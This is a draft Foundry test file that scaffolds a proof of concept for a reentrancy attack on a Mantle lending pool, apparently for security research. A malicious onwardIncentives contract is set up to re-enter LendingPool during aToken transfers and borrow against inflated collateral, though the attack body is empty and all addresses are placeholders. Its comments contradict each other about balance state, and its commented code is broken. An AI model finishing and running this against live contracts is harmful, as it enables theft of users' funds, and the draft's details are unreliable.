// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/StdJson.sol";

/**
 * @title Forefy: ChefIncentivesController -> onwardIncentives -> LendingPool Reentrancy Bridge POC
 * @notice DRAFT — Phase 9 will finalize and run against a Mantle mainnet fork.
 *
 * Attacker Story:
 *   The aToken transfer flow is: IncentivizedERC20._transfer() → updates balances (state)
 *   → ChefIncentivesController.handleAction() → onwardIncentives.handleAction() (external).
 *   Because balances are updated BEFORE the external call, a malicious onwardIncentives
 *   contract can re-enter the LendingPool and observe already-updated state.
 *
 *   This POC scaffolds the minimal exploit: deploy a malicious onwardIncentives, register
 *   it on a ChefIncentivesController pool, then trigger an aToken transfer and re-enter
 *   LendingPool to borrow against inflated collateral.
 *
 * Requirements (to be filled in Phase 9):
 *   - Mantle mainnet RPC URL
 *   - Known addresses for LendingPool, ChefIncentivesController, aTokens
 */

// Minimal ABI for the interfaces we need
interface IChefIncentivesController {
    function setOnwardIncentives(address _token, address _incentives) external;
    function poolInfo(address) external view returns (uint256 totalSupply, uint256 allocPoint, uint256 lastRewardTime, uint256 accRewardPerShare, address onwardIncentives);
}

interface ILendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralETH, uint256 totalDebtETH,
        uint256 availableBorrowsETH, uint256 currentLiquidationThreshold,
        uint256 ltv, uint256 healthFactor
    );
}

interface IAToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function UNDERLYING_ASSET_ADDRESS() external view returns (address);
}

/**
 * @dev Malicious onwardIncentives contract that re-enters LendingPool during a token transfer.
 *
 * Attack plan triggered from transfer:
 *   1. Receives handleAction() callback during aToken.transfer()
 *   2. Re-enters LendingPool.deposit() with no additional funds (or borrowed funds)
 *   3. Re-enters LendingPool.borrow() against inflated/captured collateral
 *   4. Uses premium from manipulated state
 */
contract MaliciousOnwardIncentives {
    ILendingPool public lendingPool;
    address public tokenToDeposit;
    address public tokenToBorrow;
    address public attacker;
    bool public attackTriggered;
    uint256 public depositedAmount;

    event AttackExecuted(address indexed attacker, uint256 borrowedAmount);

    constructor(address _lendingPool) {
        lendingPool = ILendingPool(_lendingPool);
    }

    function configure(
        address _tokenToDeposit,
        address _tokenToBorrow,
        address _attacker
    ) external {
        tokenToDeposit = _tokenToDeposit;
        tokenToBorrow = _tokenToBorrow;
        attacker = _attacker;
    }

    function handleAction(
        address _token,
        address _user,
        uint256 _balance,
        uint256 _totalSupply
    ) external {
        if (attackTriggered) return; // prevent infinite recursion
        attackTriggered = true;

        // Re-entrant call: during a token transfer callback, we re-enter
        // the LendingPool. The aToken balances have already been updated
        // by IncentivizedERC20._transfer() before this callback fires.
        //
        // Phase 9: Execute the re-entrant operations here.
        // Example: using the user's updated aToken balance as collateral
        // to borrow against.
        //
        // NOTE: The exact exploit depends on pool state at fork block.
        // Below is the skeleton.
    }

    // Allow receiving ETH for gas
    receive() external payable {}
}

contract ForefyReentrancyBridgeDraft is Test {
    using stdJson for string;

    // ---- TO BE POPULATED WITH MAINNET ADDRESSES ----
    // These come from the actual Mantle deployment
    address constant LENDING_POOL = address(0);
    address constant CHEF_INCENTIVES_CONTROLLER = address(0);
    address constant ATOKEN_WETH = address(0);
    address constant ATOKEN_USDC = address(0);
    address constant WETH = address(0);
    address constant USDC = address(0);
    address constant LEND_TOKEN = address(0);

    MaliciousOnwardIncentives malicious;
    IChefIncentivesController chef;
    ILendingPool pool;
    IAToken aWETH;
    IAToken aUSDC;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public virtual {
        // Phase 9: fork Mantle mainnet
        // vm.createSelectFork(vm.rpcUrl("mantle"));

        // Phase 9: instantiate contracts from known addresses
        // chef = IChefIncentivesController(CHEF_INCENTIVES_CONTROLLER);
        // pool = ILendingPool(LENDING_POOL);
        // aWETH = IAToken(ATOKEN_WETH);
        // aUSDC = IAToken(ATOKEN_USDC);

        // Deploy malicious onward incentives
        malicious = new MaliciousOnwardIncentives(LENDING_POOL);
        malicious.configure(ATOKEN_WETH, ATOKEN_USDC, attacker);

        // Phase 9: ensure the ChefIncentivesController has a pool for the aToken
        // then register the malicious onward incentives:
        // chef.setOnwardIncentives(ATOKEN_WETH, address(malicious));
    }

    /**
     * @dev Test: trigger aToken transfer and observe reentrancy into LendingPool.
     *
     * Attack flow:
     *   1. Attacker acquires some aTokens (e.g., has deposited before this test)
     *   2. Attacker transfers aTokens to another address
     *   3. During the transfer callback, ChefIncentivesController.handleAction()
     *      calls our malicious onwardIncentives.handleAction()
     *   4. In the callback, we re-enter LendingPool to borrow against the
     *      attacker's (now still high) aToken balance
     *   5. Verify that we successfully borrowed during the callback
     */
    function test_reentrancy_during_atoken_transfer() public {
        // Phase 9: Complete with real fork data
        // 1. Fund attacker with aTokens (deposit collateral before)
        // 2. Transfer triggers the reentrancy bridge
        // 3. Verify borrowed amount
        
        // For now, just verify the setup
        assertTrue(address(malicious) != address(0), "Malicious contract deployed");
        
        // Phase 9 expected assertion:
        // assertGt(malicious.borrowedAmount(), 0, "Should have borrowed during reentrancy");
    }

    /**
     * @dev Helper: print current pool state for a user
     */
    function logUserState(address user) internal view {
        // Phase 9: uncomment when pool address is populated
        // (,,,, uint256 healthFactor) = pool.getUserAccountData(user);
        // emit log_named_uint("healthFactor", healthFactor);
    }
}
